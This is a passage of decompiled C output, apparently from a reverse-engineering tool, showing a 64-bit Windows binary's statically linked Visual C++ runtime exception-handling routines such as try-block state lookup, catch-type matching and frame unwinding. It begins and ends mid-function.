  uint uVar1;
  longlong lVar2;
  uint uVar3;
  int *piVar4;
  
  if (param_1 == 0) {
    FUN_14000db20();
  }
  uVar1 = *(uint *)(param_1 + 0x14);
  if ((longlong)*(int *)(param_1 + 0x18) + *(longlong *)(param_2 + 8) == 0) {
    FUN_14000db20();
  }
  uVar3 = 0;
  if (uVar1 != 0) {
    lVar2 = *(longlong *)(param_2 + 8);
    piVar4 = (int *)(lVar2 + *(int *)(param_1 + 0x18));
    do {
      if (param_3 < *piVar4 + lVar2) break;
      uVar3 = uVar3 + 1;
      piVar4 = piVar4 + 2;
    } while (uVar3 < uVar1);
    if (uVar3 != 0) {
      return *(undefined4 *)
              ((longlong)*(int *)(param_1 + 0x18) + (ulonglong)(uVar3 - 1) * 8 + 4 + lVar2);
    }
  }
  return 0xffffffff;
}




undefined4 FUN_14000c180(longlong param_1,longlong *param_2)

{
  uint uVar1;
  longlong lVar2;
  longlong lVar3;
  uint uVar4;
  int *piVar5;
  
  lVar2 = *param_2;
  if (param_1 == 0) {
    FUN_14000db20();
  }
  uVar1 = *(uint *)(param_1 + 0x14);
  if ((longlong)*(int *)(param_1 + 0x18) + param_2[1] == 0) {
    FUN_14000db20();
  }
  uVar4 = 0;
  if (uVar1 != 0) {
    lVar3 = param_2[1];
    piVar5 = (int *)(lVar3 + *(int *)(param_1 + 0x18));
    do {
      if (lVar2 < *piVar5 + lVar3) break;
      uVar4 = uVar4 + 1;
      piVar5 = piVar5 + 2;
    } while (uVar4 < uVar1);
    if (uVar4 != 0) {
      return *(undefined4 *)
              (lVar3 + (ulonglong)(uVar4 - 1) * 8 + 4 + (longlong)*(int *)(param_1 + 0x18));
    }
  }
  return 0xffffffff;
}




int FUN_14000c210(longlong *param_1,longlong *param_2,longlong param_3)

{
  uint uVar1;
  longlong lVar2;
  longlong lVar3;
  int iVar4;
  uint uVar5;
  int *piVar6;
  
  iVar4 = *(int *)((longlong)*(int *)(param_3 + 0x1c) + *param_1);
  if (iVar4 == -2) {
    uVar1 = *(uint *)(param_3 + 0x14);
    lVar2 = *param_2;
    if ((longlong)*(int *)(param_3 + 0x18) + param_2[1] == 0) {
      FUN_14000db20();
    }
    uVar5 = 0;
    if (uVar1 != 0) {
      lVar3 = param_2[1];
      piVar6 = (int *)(lVar3 + *(int *)(param_3 + 0x18));
      do {
        if (lVar2 < *piVar6 + lVar3) break;
        uVar5 = uVar5 + 1;
        piVar6 = piVar6 + 2;
      } while (uVar5 < uVar1);
      if (uVar5 != 0) {
        return *(int *)((longlong)*(int *)(param_3 + 0x18) + (ulonglong)(uVar5 - 1) * 8 + 4 + lVar3)
        ;
      }
    }
    iVar4 = -1;
  }
  return iVar4;
}




void FUN_14000c2b0(longlong *param_1,undefined8 param_2,longlong param_3,undefined4 param_4)

{
  *(undefined4 *)((longlong)*(int *)(param_3 + 0x1c) + *param_1) = param_4;
  return;
}




/* Library Function - Single Match
    void __cdecl __SetUnwindTryBlock(unsigned __int64 * __ptr64,struct _xDISPATCHER_CONTEXT *
   __ptr64,struct _s_FuncInfo const * __ptr64,int)
   
   Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release, Visual Studio 2012 Release */

void __cdecl
__SetUnwindTryBlock(__uint64 *param_1,_xDISPATCHER_CONTEXT *param_2,_s_FuncInfo *param_3,int param_4
                   )

{
  longlong *plVar1;
  longlong local_res18 [2];
  
  plVar1 = FUN_1400074d0((longlong *)param_1,(DWORD64 *)param_2,(longlong)param_3,local_res18);
  if (*(int *)((longlong)param_3->dispUnwindHelp + 4 + *plVar1) < param_4) {
    *(int *)((longlong)param_3->dispUnwindHelp + 4 + *plVar1) = param_4;
  }
  return;
}




/* Library Function - Multiple Matches With Same Base Name
    public: static int __cdecl __FrameHandler3::GetUnwindTryBlock(unsigned __int64 * __ptr64,struct
   _xDISPATCHER_CONTEXT * __ptr64,struct _s_FuncInfo const * __ptr64)
    int __cdecl __GetUnwindTryBlock(unsigned __int64 * __ptr64,struct _xDISPATCHER_CONTEXT *
   __ptr64,struct _s_FuncInfo const * __ptr64)
   
   Library: Visual Studio */

undefined4 GetUnwindTryBlock(longlong *param_1,DWORD64 *param_2,longlong param_3)

{
  longlong *plVar1;
  longlong local_res18 [2];
  
  plVar1 = FUN_1400074d0(param_1,param_2,param_3,local_res18);
  return *(undefined4 *)((longlong)*(int *)(param_3 + 0x1c) + 4 + *plVar1);
}




undefined8 * FUN_14000c340(undefined8 *param_1,uint param_2)

{
  *param_1 = std::bad_exception::vftable;
  FUN_140007fa0(param_1);
  if ((param_2 & 1) != 0) {
    thunk_FUN_14000b9c0(param_1);
  }
  return param_1;
}




/* Library Function - Single Match
    __FrameUnwindFilter
   
   Library: Visual Studio 2005 Release */

undefined8 __FrameUnwindFilter(undefined8 *param_1)

{
  code *pcVar1;
  DWORD *pDVar2;
  undefined8 uVar3;
  
  if (*(int *)*param_1 == -0x1fbcb0b3) {
    pDVar2 = FUN_14000b3d0();
    if (0 < (int)pDVar2[0x40]) {
      pDVar2 = FUN_14000b3d0();
      pDVar2[0x40] = pDVar2[0x40] - 1;
    }
  }
  else if (*(int *)*param_1 == -0x1f928c9d) {
    pDVar2 = FUN_14000b3d0();
    pDVar2[0x40] = 0;
    terminate();
    pcVar1 = (code *)swi(3);
    uVar3 = (*pcVar1)();
    return uVar3;
  }
  return 0;
}




void FUN_14000c3d0(longlong *param_1,longlong *param_2,longlong param_3,int param_4)

{
  int iVar1;
  int iVar2;
  undefined8 uVar3;
  DWORD *pDVar4;
  longlong lVar5;
  longlong lVar6;
  
  iVar2 = FUN_14000c210(param_1,param_2,param_3);
  uVar3 = FUN_1400075e0();
  pDVar4 = FUN_14000b3d0();
  pDVar4[0x40] = pDVar4[0x40] + 1;
  while ((iVar2 != -1 && (param_4 < iVar2))) {
    if ((iVar2 < 0) || (*(int *)(param_3 + 4) <= iVar2)) {
      FUN_14000db20();
    }
    lVar6 = (longlong)iVar2;
    lVar5 = FUN_1400075e0();
    iVar2 = *(int *)((longlong)*(int *)(param_3 + 8) + lVar5 + lVar6 * 8);
    lVar5 = FUN_1400075e0();
    if (*(int *)((longlong)*(int *)(param_3 + 8) + 4 + lVar5 + lVar6 * 8) != 0) {
      lVar5 = FUN_1400075e0();
      iVar1 = *(int *)((longlong)*(int *)(param_3 + 8) + 4 + lVar5 + lVar6 * 8);
      lVar5 = FUN_1400075e0();
      if (lVar5 + iVar1 != 0) {
        FUN_14000c2b0(param_1,param_2,param_3,iVar2);
        lVar5 = FUN_1400075e0();
        if (*(int *)((longlong)*(int *)(param_3 + 8) + 4 + lVar5 + lVar6 * 8) != 0) {
          FUN_1400075e0();
          FUN_1400075e0();
        }
        _CallSettingFrame();
        FUN_140007620(uVar3);
      }
    }
  }
  pDVar4 = FUN_14000b3d0();
  if (0 < (int)pDVar4[0x40]) {
    pDVar4 = FUN_14000b3d0();
    pDVar4[0x40] = pDVar4[0x40] - 1;
  }
  if ((iVar2 != -1) && (param_4 < iVar2)) {
    FUN_14000db20();
  }
  FUN_14000c2b0(param_1,param_2,param_3,iVar2);
  return;
}




void FUN_14000c570(undefined8 *param_1)

{
  __FrameUnwindFilter(param_1);
  return;
}




void FUN_14000c590(void)

{
  DWORD *pDVar1;
  
  pDVar1 = FUN_14000b3d0();
  if (0 < (int)pDVar1[0x40]) {
    pDVar1 = FUN_14000b3d0();
    pDVar1[0x40] = pDVar1[0x40] - 1;
  }
  return;
}




/* Library Function - Single Match
    int __cdecl ExFilterRethrow(struct _EXCEPTION_POINTERS * __ptr64,struct EHExceptionRecord *
   __ptr64,int * __ptr64)
   
   Library: Visual Studio 2005 Release */

int __cdecl ExFilterRethrow(_EXCEPTION_POINTERS *param_1,EHExceptionRecord *param_2,int *param_3)

{
  int iVar1;
  PEXCEPTION_RECORD pEVar2;
  DWORD *pDVar3;
  
  pEVar2 = param_1->ExceptionRecord;
  *param_3 = 0;
  if (pEVar2->ExceptionCode == 0xe06d7363) {
    if ((pEVar2->NumberParameters == 4) &&
       ((((iVar1 = (int)pEVar2->ExceptionInformation[0], iVar1 == 0x19930520 ||
          (iVar1 == 0x19930521)) || (iVar1 == 0x19930522)) &&
        (pEVar2->ExceptionInformation[1] == *(ULONG_PTR *)(param_2 + 0x28))))) {
      *param_3 = 1;
    }
    if ((((pEVar2->ExceptionCode == 0xe06d7363) && (pEVar2->NumberParameters == 4)) &&
        ((iVar1 = (int)pEVar2->ExceptionInformation[0], iVar1 == 0x19930520 ||
         ((iVar1 == 0x19930521 || (iVar1 == 0x19930522)))))) &&
       (pEVar2->ExceptionInformation[2] == 0)) {
      pDVar3 = FUN_14000b3d0();
      pDVar3[0xb4] = 1;
      *param_3 = 1;
      return 1;
    }
  }
  return 0;
}




/* Library Function - Single Match
    __DestructExceptionObject
   
   Library: Visual Studio 2005 Release */

void __DestructExceptionObject(int *param_1)

{
  int iVar1;
  
  if ((((param_1 != (int *)0x0) && (*param_1 == -0x1f928c9d)) && (*(longlong *)(param_1 + 0xc) != 0)
      ) && (iVar1 = *(int *)(*(longlong *)(param_1 + 0xc) + 4), iVar1 != 0)) {
    (*(code *)(*(longlong *)(param_1 + 0xe) + (longlong)iVar1))(*(undefined8 *)(param_1 + 10));
  }
  return;
}




bool FUN_14000c6c0(undefined8 param_1,longlong param_2)

{
  return *(char *)(param_2 + 0x38) != '\0';
}




/* Library Function - Single Match
    __AdjustPointer
   
   Library: Visual Studio 2005 Release */

longlong __AdjustPointer(longlong param_1,int *param_2)

{
  longlong lVar1;
  
  lVar1 = *param_2 + param_1;
  if (-1 < param_2[1]) {
    lVar1 = lVar1 + (longlong)*(int *)((longlong)param_2[2] + *(longlong *)(param_2[1] + param_1)) +
                    (longlong)param_2[1];
  }
  return lVar1;
}




undefined1 FUN_14000c710(longlong param_1,int *param_2)

{
  char cVar1;
  char cVar2;
  uint uVar3;
  uint *puVar4;
  code *pcVar5;
  undefined1 uVar6;
  longlong lVar7;
  longlong lVar8;
  char *pcVar9;
  int iVar10;
  byte *pbVar11;
  int iVar12;
  byte *pbVar13;
  int *piVar14;
  int iVar15;
  longlong lVar16;
  undefined1 local_res18;
  
  if (param_2 == (int *)0x0) {
    FUN_14000db20();
    terminate();
    pcVar5 = (code *)swi(3);
    uVar6 = (*pcVar5)();
    return uVar6;
  }
  uVar6 = 0;
  iVar15 = 0;
  local_res18 = 0;
  if (0 < *param_2) {
    lVar16 = 0;
    do {
      lVar7 = FUN_140007600();
      piVar14 = (int *)(lVar7 + 4 + (longlong)*(int *)(*(longlong *)(param_1 + 0x30) + 0xc));
      lVar7 = FUN_140007600();
      for (iVar12 = *(int *)(lVar7 + *(int *)(*(longlong *)(param_1 + 0x30) + 0xc)); 0 < iVar12;
          iVar12 = iVar12 + -1) {
        lVar7 = FUN_140007600();
        puVar4 = *(uint **)(param_1 + 0x30);
        pbVar11 = (byte *)(lVar7 + *piVar14);
        lVar7 = FUN_1400075e0();
        pbVar13 = (byte *)((longlong)param_2[1] + lVar7 + lVar16);
        if (*(int *)(pbVar13 + 4) == 0) {
LAB_14000c8fd:
          uVar6 = 1;
          local_res18 = 1;
          break;
        }
        iVar10 = *(int *)(pbVar13 + 4);
        lVar7 = FUN_1400075e0();
        if (lVar7 + iVar10 == 0) {
          uVar6 = 1;
          local_res18 = 1;
          break;
        }
        if (iVar10 == 0) {
          lVar7 = 0;
          iVar10 = 0;
        }
        else {
          iVar10 = *(int *)(pbVar13 + 4);
          lVar7 = FUN_1400075e0();
          lVar7 = iVar10 + lVar7;
        }
        if (*(char *)(lVar7 + 0x10) == '\0') {
          uVar6 = 1;
          local_res18 = 1;
          break;
        }
        if (iVar10 == 0) {
          lVar7 = 0;
        }
        else {
          lVar7 = FUN_1400075e0();
          lVar7 = lVar7 + *(int *)(pbVar13 + 4);
        }
        lVar8 = FUN_140007600();
        if (lVar7 == lVar8 + *(int *)(pbVar11 + 4)) {
LAB_14000c878:
          if (((((*pbVar11 & 2) == 0) || ((*pbVar13 & 8) != 0)) &&
              ((uVar3 = *puVar4, (uVar3 & 1) == 0 || ((*pbVar13 & 1) != 0)))) &&
             (((uVar3 & 4) == 0 || ((*pbVar13 & 4) != 0)))) {
            if ((uVar3 & 2) == 0) goto LAB_14000c8fd;
            if ((*pbVar13 & 2) != 0) {
              uVar6 = 1;
              local_res18 = 1;
              break;
            }
          }
        }
        else {
          if (*(int *)(pbVar13 + 4) == 0) {
            lVar7 = 0;
          }
          else {
            lVar7 = FUN_1400075e0();
            lVar7 = lVar7 + *(int *)(pbVar13 + 4);
          }
          lVar8 = FUN_140007600();
          pcVar9 = (char *)(lVar7 + 0x10);
          lVar7 = (lVar8 + 0x10 + (longlong)*(int *)(pbVar11 + 4)) - (longlong)pcVar9;
          do {
            cVar1 = *pcVar9;
            cVar2 = pcVar9[lVar7];
            if (cVar1 != cVar2) break;
            pcVar9 = pcVar9 + 1;
          } while (cVar2 != '\0');
          if (cVar1 == cVar2) goto LAB_14000c878;
        }
        piVar14 = piVar14 + 1;
        uVar6 = local_res18;
      }
      iVar15 = iVar15 + 1;
      lVar16 = lVar16 + 0x14;
    } while (iVar15 < *param_2);
  }
  return uVar6;
}




ulonglong FUN_14000c960(int *param_1)

{
  int iVar1;
  bool bVar2;
  ulonglong in_RAX;
  longlong lVar3;
  type_info *this;
  undefined7 extraout_var;
  longlong lVar4;
  int iVar5;
  
  iVar5 = 0;
  if (0 < *param_1) {
    lVar4 = 0;
    do {
      lVar3 = FUN_1400075e0();
      if (*(int *)((longlong)param_1[1] + 4 + lVar3 + lVar4) == 0) {
        this = (type_info *)0x0;
      }
      else {
        lVar3 = FUN_1400075e0();
        iVar1 = *(int *)((longlong)param_1[1] + 4 + lVar3 + lVar4);
        lVar3 = FUN_1400075e0();
        this = (type_info *)(lVar3 + iVar1);
      }
      bVar2 = type_info::operator==(this,(type_info *)&std::bad_exception::RTTI_Type_Descriptor);
      in_RAX = CONCAT71(extraout_var,bVar2);
      if (bVar2) {
        return CONCAT71(extraout_var,1);
      }
      iVar5 = iVar5 + 1;
      lVar4 = lVar4 + 0x14;
    } while (iVar5 < *param_1);
  }
  return in_RAX & 0xffffffffffffff00;
}




void FUN_14000cc20(_EXCEPTION_POINTERS *param_1,longlong param_2)

{
  *(_EXCEPTION_POINTERS **)(param_2 + 0x58) = param_1;
  ExFilterRethrow(param_1,*(EHExceptionRecord **)(param_2 + 0xb8),(int *)(param_2 + 0x20));
  return;
}




char FUN_14000cce0(longlong param_1,longlong *param_2,uint *param_3,byte *param_4)

{
  uint uVar1;
  bool bVar2;
  longlong lVar3;
  undefined7 extraout_var;
  undefined7 extraout_var_00;
  undefined7 extraout_var_01;
  undefined7 extraout_var_02;
  undefined7 extraout_var_03;
  undefined7 extraout_var_04;
  undefined7 extraout_var_05;
  undefined7 extraout_var_06;
  undefined7 extraout_var_07;
  void *_Src;
  ulonglong uVar4;
  ulonglong uVar5;
  size_t _Size;
  ulonglong uVar6;
  
  uVar4 = 0;
  uVar5 = 0;
  if (param_3[1] != 0) {
    uVar1 = param_3[1];
    lVar3 = FUN_1400075e0();
    if ((int)uVar1 + lVar3 != 0) {
      uVar6 = uVar4;
      if (uVar1 != 0) {
        lVar3 = FUN_1400075e0();
        uVar6 = lVar3 + (int)param_3[1];
      }
      if ((*(char *)(uVar6 + 0x10) != '\0') && ((param_3[2] != 0 || ((int)*param_3 < 0)))) {
        if (-1 < (int)*param_3) {
          param_2 = (longlong *)((longlong)(int)param_3[2] + *param_2);
        }
        if ((*param_3 & 8) == 0) {
          if ((*param_4 & 1) == 0) {
            if ((*(int *)(param_4 + 0x18) == 0) ||
               (lVar3 = FUN_140007600(), lVar3 + *(int *)(param_4 + 0x18) == 0)) {
              bVar2 = FUN_140012ea0(*(longlong *)(param_1 + 0x28));
              if (((int)CONCAT71(extraout_var_06,bVar2) == 0) ||
                 (bVar2 = FUN_140012ea0((longlong)param_2),
                 (int)CONCAT71(extraout_var_07,bVar2) == 0)) {
                FUN_14000db20();
                uVar4 = uVar5;
              }
              else {
                _Size = (size_t)*(int *)(param_4 + 0x14);
                _Src = (void *)__AdjustPointer(*(longlong *)(param_1 + 0x28),(int *)(param_4 + 8));
                memcpy(param_2,_Src,_Size);
                uVar4 = uVar5;
              }
            }
            else {
              bVar2 = FUN_140012ea0(*(longlong *)(param_1 + 0x28));
              if (((int)CONCAT71(extraout_var_03,bVar2) != 0) &&
                 (bVar2 = FUN_140012ea0((longlong)param_2),
                 (int)CONCAT71(extraout_var_04,bVar2) != 0)) {
                if (*(int *)(param_4 + 0x18) != 0) {
                  lVar3 = FUN_140007600();
                  uVar4 = lVar3 + *(int *)(param_4 + 0x18);
                }
                bVar2 = FUN_140012ea0(uVar4);
                if ((int)CONCAT71(extraout_var_05,bVar2) != 0) {
                  uVar4 = (ulonglong)(((*param_4 & 4) != 0) + 1);
                  goto LAB_14000cee1;
                }
              }
              FUN_14000db20();
              uVar4 = uVar5;
            }
          }
          else {
            bVar2 = FUN_140012ea0(*(longlong *)(param_1 + 0x28));
            if (((int)CONCAT71(extraout_var_01,bVar2) == 0) ||
               (bVar2 = FUN_140012ea0((longlong)param_2), (int)CONCAT71(extraout_var_02,bVar2) == 0)
               ) {
              FUN_14000db20();
              uVar4 = uVar5;
            }
            else {
              memcpy(param_2,*(void **)(param_1 + 0x28),(longlong)*(int *)(param_4 + 0x14));
              if ((*(int *)(param_4 + 0x14) == 8) && (uVar4 = uVar5, *param_2 != 0)) {
                lVar3 = __AdjustPointer(*param_2,(int *)(param_4 + 8));
                *param_2 = lVar3;
              }
            }
          }
        }
        else {
          bVar2 = FUN_140012ea0(*(longlong *)(param_1 + 0x28));
          if (((int)CONCAT71(extraout_var,bVar2) == 0) ||
             (bVar2 = FUN_140012ea0((longlong)param_2), (int)CONCAT71(extraout_var_00,bVar2) == 0))
          {
            FUN_14000db20();
          }
          else {
            lVar3 = *(longlong *)(param_1 + 0x28);
            *param_2 = lVar3;
            lVar3 = __AdjustPointer(lVar3,(int *)(param_4 + 8));
            *param_2 = lVar3;
          }
        }
LAB_14000cee1:
        return (char)uVar4;
      }
    }
  }
  return '\0';
}




void FUN_14000cf10(longlong param_1,longlong *param_2,uint *param_3,byte *param_4)

{
  char cVar1;
  int iVar2;
  undefined7 extraout_var;
  longlong lVar3;
  longlong *plVar4;
  code *pcVar5;
  
  plVar4 = param_2;
  if (-1 < (int)*param_3) {
    plVar4 = (longlong *)((longlong)(int)param_3[2] + *param_2);
  }
  cVar1 = FUN_14000cce0(param_1,param_2,param_3,param_4);
  iVar2 = (int)CONCAT71(extraout_var,cVar1);
  if (iVar2 == 1) {
    if (*(int *)(param_4 + 0x18) == 0) {
      pcVar5 = (code *)0x0;
    }
    else {
      lVar3 = FUN_140007600();
      pcVar5 = (code *)(*(int *)(param_4 + 0x18) + lVar3);
    }
    lVar3 = __AdjustPointer(*(longlong *)(param_1 + 0x28),(int *)(param_4 + 8));
    (*pcVar5)(plVar4,lVar3);
  }
  else if (iVar2 == 2) {
    if (*(int *)(param_4 + 0x18) == 0) {
      pcVar5 = (code *)0x0;
    }
    else {
      lVar3 = FUN_140007600();
      pcVar5 = (code *)(lVar3 + *(int *)(param_4 + 0x18));
    }
    lVar3 = __AdjustPointer(*(longlong *)(param_1 + 0x28),(int *)(param_4 + 8));
    (*pcVar5)(plVar4,lVar3,1);
  }
  return;
}




void FUN_14000cfd0(int *param_1,longlong *param_2,ULONG_PTR param_3,DWORD64 *param_4,
                  ULONG_PTR param_5,int param_6,uint param_7)

{
  int iVar1;
  int iVar2;
  DWORD *pDVar3;
  INT_PTR IVar4;
  int *piVar5;
  longlong lVar6;
  longlong *plVar7;
  longlong lVar8;
  uint local_res8 [2];
  uint local_48 [2];
  longlong local_40;
  
  if (*param_1 != -0x7ffffffd) {
    pDVar3 = FUN_14000b3d0();
    if (*(longlong *)(pDVar3 + 0x38) != 0) {
      pDVar3 = FUN_14000b3d0();
      IVar4 = FUN_14000aff0();
      if (((*(longlong *)(pDVar3 + 0x38) != IVar4) && (*param_1 != -0x1fbcb0b3)) &&
         (iVar2 = FUN_1400078f0(param_1,param_2,param_3), iVar2 != 0)) {
        return;
      }
    }
    if (*(int *)(param_5 + 0xc) == 0) {
      FUN_14000db20();
    }
    piVar5 = (int *)FUN_1400079a0(param_2,param_5,(ulonglong)param_7,param_6,local_res8,
                                  (int *)local_48,(longlong *)param_4);
    if (local_res8[0] < local_48[0]) {
      do {
        if ((*piVar5 <= param_6) && (param_6 <= piVar5[1])) {
          lVar6 = FUN_1400075e0();
          if (*(int *)(lVar6 + -0x10 + (longlong)piVar5[4] + (longlong)piVar5[3] * 0x14) != 0) {
            lVar6 = FUN_1400075e0();
            iVar2 = *(int *)(lVar6 + -0x10 + (longlong)piVar5[4] + (longlong)piVar5[3] * 0x14);
            lVar6 = FUN_1400075e0();
            if (lVar6 + iVar2 != 0) {
              lVar6 = FUN_1400075e0();
              if (*(int *)(lVar6 + -0x10 + (longlong)piVar5[4] + (longlong)piVar5[3] * 0x14) == 0) {
                lVar6 = 0;
              }
              else {
                lVar6 = FUN_1400075e0();
                iVar2 = *(int *)(lVar6 + -0x10 + (longlong)piVar5[4] + (longlong)piVar5[3] * 0x14);
                lVar6 = FUN_1400075e0();
                lVar6 = lVar6 + iVar2;
              }
              if (*(char *)(lVar6 + 0x10) != '\0') goto LAB_14000d20c;
            }
          }
          lVar6 = FUN_1400075e0();
          if ((*(byte *)(lVar6 + -0x14 + (longlong)piVar5[4] + (longlong)piVar5[3] * 0x14) & 0x40)
              == 0) {
            lVar6 = FUN_1400075e0();
            iVar2 = piVar5[3];
            iVar1 = piVar5[4];
            plVar7 = FUN_1400074d0(param_2,param_4,param_5,&local_40);
            lVar8 = FUN_1400075e0();
            _UnwindNestedFrames(param_2,(ULONG_PTR)param_1,param_3,(ULONG_PTR)plVar7,
                                lVar8 + *(int *)(lVar6 + (longlong)(iVar2 + -1) * 0x14 +
                                                 (longlong)iVar1 + 0xc),*piVar5,param_5,param_4,0);
          }
        }
LAB_14000d20c:
        local_res8[0] = local_res8[0] + 1;
        piVar5 = piVar5 + 5;
      } while (local_res8[0] < local_48[0]);
    }
  }
  return;
}




void FUN_14000d250(int *param_1,__uint64 *param_2,ULONG_PTR param_3,_xDISPATCHER_CONTEXT *param_4,
                  _s_FuncInfo *param_5,byte param_6,uint param_7)

{
  uint *puVar1;
  code *pcVar2;
  bool bVar3;
  char cVar4;
  char cVar5;
  int iVar6;
  int iVar7;
  DWORD *pDVar8;
  undefined7 extraout_var;
  undefined8 uVar9;
  int *piVar10;
  longlong lVar11;
  longlong lVar12;
  longlong *plVar13;
  char *pcVar14;
  uint uVar15;
  byte *pbVar16;
  uint *puVar17;
  char *local_res8;
  __uint64 *local_res10;
  ULONG_PTR local_res18;
  _xDISPATCHER_CONTEXT *local_res20;
  uint local_558;
  uint local_554;
  int local_550;
  int *local_548;
  longlong local_540;
  longlong local_538;
  undefined **local_530 [3];
  undefined1 local_518 [1240];
  
  cVar5 = '\0';
  local_res8 = (char *)((ulonglong)local_res8 & 0xffffffffffffff00);
  local_res10 = param_2;
  local_res18 = param_3;
  local_res20 = param_4;
  iVar6 = FUN_14000c180((longlong)param_5,(longlong *)param_4);
  local_550 = iVar6;
  FUN_1400074d0((longlong *)param_2,(DWORD64 *)param_4,(longlong)param_5,&local_540);
  iVar7 = GetUnwindTryBlock((longlong *)param_2,(DWORD64 *)param_4,(longlong)param_5);
  if (iVar7 < iVar6) {
    FUN_14000c2b0(&local_540,param_4,(longlong)param_5,iVar6);
    __SetUnwindTryBlock(param_2,param_4,param_5,iVar6);
  }
  else {
    iVar6 = GetUnwindTryBlock((longlong *)param_2,(DWORD64 *)param_4,(longlong)param_5);
    local_550 = iVar6;
  }
  if ((iVar6 < -1) || (param_5->maxState <= iVar6)) {
    FUN_14000db20();
  }
  if ((((*param_1 == -0x1f928c9d) && (param_1[6] == 4)) &&
      ((iVar7 = param_1[8], iVar7 == 0x19930520 || ((iVar7 == 0x19930521 || (iVar7 == 0x19930522))))
      )) && (*(longlong *)(param_1 + 0xc) == 0)) {
    pDVar8 = FUN_14000b3d0();
    if (*(longlong *)(pDVar8 + 0x3c) == 0) {
      return;
    }
    pDVar8 = FUN_14000b3d0();
    param_1 = *(int **)(pDVar8 + 0x3c);
    pDVar8 = FUN_14000b3d0();
    param_3 = *(ULONG_PTR *)(pDVar8 + 0x3e);
    local_res18 = param_3;
    FUN_140007640(*(undefined8 *)(param_1 + 0xe));
    bVar3 = FUN_140012ea0((longlong)param_1);
    if ((int)CONCAT71(extraout_var,bVar3) == 0) {
      FUN_14000db20();
    }
    if (((*param_1 == -0x1f928c9d) && (param_1[6] == 4)) &&
       (((iVar7 = param_1[8], iVar7 == 0x19930520 ||
         ((iVar7 == 0x19930521 || (iVar7 == 0x19930522)))) && (*(longlong *)(param_1 + 0xc) == 0))))
    {
      FUN_14000db20();
    }
    pDVar8 = FUN_14000b3d0();
    if (*(longlong *)(pDVar8 + 0x42) != 0) {
      pDVar8 = FUN_14000b3d0();
      piVar10 = *(int **)(pDVar8 + 0x42);
      pDVar8 = FUN_14000b3d0();
      pDVar8[0x42] = 0;
      pDVar8[0x43] = 0;
      cVar4 = FUN_14000c710((longlong)param_1,piVar10);
      param_3 = local_res18;
      if (cVar4 == '\0') {
        uVar9 = FUN_14000c960(piVar10);
        if ((char)uVar9 == '\0') {
          terminate();
          pcVar2 = (code *)swi(3);
          (*pcVar2)();
          return;
        }
        __DestructExceptionObject(param_1);
        local_res8 = "bad exception";
        FUN_140007e40(local_530,&local_res8);
        local_530[0] = std::bad_exception::vftable;
                    /* WARNING: Subroutine does not return */
        _CxxThrowException(local_530,(ThrowInfo *)&DAT_140019448);
      }
    }
  }
  if (((*param_1 == -0x1f928c9d) && (param_1[6] == 4)) &&
     ((iVar7 = param_1[8], iVar7 == 0x19930520 || ((iVar7 == 0x19930521 || (iVar7 == 0x19930522)))))
     ) {
    if ((param_5->nTryBlocks != 0) &&
       (piVar10 = (int *)FUN_1400079a0(param_2,(longlong)param_5,(ulonglong)param_7,iVar6,&local_558
                                       ,(int *)&local_554,(longlong *)param_4), uVar15 = local_554,
       local_548 = piVar10, local_558 < local_554)) {
      do {
        if ((*piVar10 <= iVar6) && (iVar6 <= piVar10[1])) {
          local_548 = piVar10;
          lVar11 = FUN_1400075e0();
          iVar6 = piVar10[3];
          puVar17 = (uint *)(piVar10[4] + lVar11);
          if (iVar6 < 1) {
            cVar5 = (char)local_res8;
            iVar6 = local_550;
            uVar15 = local_554;
          }
          else {
            do {
              lVar11 = FUN_140007600();
              piVar10 = (int *)(lVar11 + 4 + (longlong)*(int *)(*(longlong *)(param_1 + 0xc) + 0xc))
              ;
              lVar11 = FUN_140007600();
              param_2 = local_res10;
              param_4 = local_res20;
              for (iVar7 = *(int *)(lVar11 + *(int *)(*(longlong *)(param_1 + 0xc) + 0xc));
                  local_res10 = param_2, local_res20 = param_4, 0 < iVar7; iVar7 = iVar7 + -1) {
                lVar11 = FUN_140007600();
                puVar1 = *(uint **)(param_1 + 0xc);
                pbVar16 = (byte *)(lVar11 + *piVar10);
                if (puVar17[1] == 0) {
LAB_14000d68c:
                  param_4 = local_res20;
                  param_2 = local_res10;
                  local_res8 = (char *)CONCAT71(local_res8._1_7_,1);
                  plVar13 = FUN_1400074d0((longlong *)local_res10,(DWORD64 *)local_res20,
                                          (longlong)param_5,&local_538);
                  if (pbVar16 != (byte *)0x0) {
                    FUN_14000cf10((longlong)param_1,plVar13,puVar17,pbVar16);
                  }
                  lVar11 = FUN_1400075e0();
                  _UnwindNestedFrames(param_2,(ULONG_PTR)param_1,local_res18,(ULONG_PTR)plVar13,
                                      lVar11 + (int)puVar17[3],*local_548,(ULONG_PTR)param_5,
                                      (undefined8 *)param_4,param_6);
                  piVar10 = local_548;
                  cVar5 = '\x01';
                  iVar6 = local_550;
                  uVar15 = local_554;
                  goto LAB_14000d73e;
                }
                uVar15 = puVar17[1];
                lVar11 = FUN_1400075e0();
                if (lVar11 + (int)uVar15 == 0) goto LAB_14000d68c;
                if (uVar15 == 0) {
                  lVar11 = 0;
                  uVar15 = 0;
                }
                else {
                  uVar15 = puVar17[1];
                  lVar11 = FUN_1400075e0();
                  lVar11 = lVar11 + (int)uVar15;
                }
                if (*(char *)(lVar11 + 0x10) == '\0') goto LAB_14000d68c;
                if (uVar15 == 0) {
                  lVar11 = 0;
                }
                else {
                  lVar11 = FUN_1400075e0();
                  lVar11 = (int)puVar17[1] + lVar11;
                }
                lVar12 = FUN_140007600();
                if (lVar11 == lVar12 + *(int *)(pbVar16 + 4)) {
LAB_14000d618:
                  if ((((((*pbVar16 & 2) == 0) || ((*puVar17 & 8) != 0)) &&
                       ((uVar15 = *puVar1, (uVar15 & 1) == 0 || ((*puVar17 & 1) != 0)))) &&
                      (((uVar15 & 4) == 0 || ((*puVar17 & 4) != 0)))) &&
                     (((uVar15 & 2) == 0 || ((*puVar17 & 2) != 0)))) goto LAB_14000d68c;
                }
                else {
                  if (puVar17[1] == 0) {
                    lVar11 = 0;
                  }
                  else {
                    lVar11 = FUN_1400075e0();
                    lVar11 = (int)puVar17[1] + lVar11;
                  }
                  lVar12 = FUN_140007600();
                  pcVar14 = (char *)(lVar11 + 0x10);
                  lVar11 = (lVar12 + 0x10 + (longlong)*(int *)(pbVar16 + 4)) - (longlong)pcVar14;
                  do {
                    cVar5 = *pcVar14;
                    cVar4 = pcVar14[lVar11];
                    if (cVar5 != cVar4) break;
                    pcVar14 = pcVar14 + 1;
                  } while (cVar4 != '\0');
                  if (cVar5 == cVar4) goto LAB_14000d618;
                }
                piVar10 = piVar10 + 1;
                param_2 = local_res10;
